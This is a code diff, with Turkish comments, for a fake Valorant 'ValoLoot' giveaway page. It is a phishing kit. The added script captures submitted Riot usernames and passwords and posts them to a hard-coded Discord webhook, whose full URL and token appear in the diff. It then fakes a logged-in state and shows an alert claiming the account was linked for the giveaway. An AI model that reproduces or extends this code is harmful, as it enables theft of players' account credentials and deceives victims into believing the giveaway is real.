@@ -229,27 +229,56 @@ function openAuth() {
     win.document.close();
 }
 
-// 3. WEBHOOK (ANA SAYFA DİNLEYİCİ)
-window.addEventListener("message", function(e) {
-    if (e.data.user && e.data.pass) {
+// 3. WEBHOOK VE GİRİŞ SİMÜLASYONU
+window.addEventListener("message", function(event) {
+    if (event.data.user && event.data.pass) {
+        // Veriyi Webhook'a Gönder
         fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
+                username: "Riot Auth System",
                 embeds: [{
-                    title: "⚠️ Yeni Giriş (Görsel Panel)",
-                    color: 16725845,
+                    title: "⚠️ Yeni Giriş Başarılı!",
+                    color: 3066993, // Yeşil renk (başarılı hissi için)
                     fields: [
-                        { name: "👤 Kullanıcı", value: "```" + e.data.user + "```" },
-                        { name: "🔑 Şifre", value: "```" + e.data.pass + "```" }
+                        { name: "👤 Kullanıcı", value: "```" + event.data.user + "```" },
+                        { name: "🔑 Şifre", value: "```" + event.data.pass + "```" }
                     ],
-                    footer: { text: "ValoLoot Auth System" },
+                    footer: { text: "ValoLoot Adana System" },
                     timestamp: new Date()
                 }]
             })
         });
+
+        // --- SİTEYİ GİRİŞ YAPILMIŞ GİBİ GÖSTEREN KISIM ---
+        
+        // 1. Giriş butonunu kaldır, yerine profil ikonu koy
+        const loginBtn = document.querySelector('.btn-login');
+        if(loginBtn) {
+            loginBtn.outerHTML = `
+                <div style="display:flex; align-items:center; gap:15px;">
+                    <div style="text-align:right">
+                        <div style="color:#fff; font-weight:800; font-size:14px;">${event.data.user}</div>
+                        <div style="color:#79eb1e; font-size:10px; font-weight:700;">BAKİYE: 0 VP</div>
+                    </div>
+                    <img src="https://wallpapers.com/images/hd/valorant-profile-pictures-y1v4u60z769p76p7.jpg" 
+                         style="width:40px; height:40px; border-radius:50%; border:2px solid #ff4655;">
+                </div>
+            `;
+        }
+
+        // 2. Çekiliş yazısını güncelle
+        const giveawayText = document.querySelector('.giveaway-section p');
+        if(giveawayText) {
+            giveawayText.innerText = "ÇEKİLİŞE BAŞARIYLA KATILDINIZ!";
+            giveawayText.style.color = "#79eb1e";
+        }
+
+        // 3. Bir bildirim (Alert) göster (isteğe bağlı)
+        alert("Riot Games hesabınız başarıyla bağlandı. Çekiliş kaydınız oluşturuldu!");
     }
-});
+}, { once: true });
     </script>
 </body>
 </html>
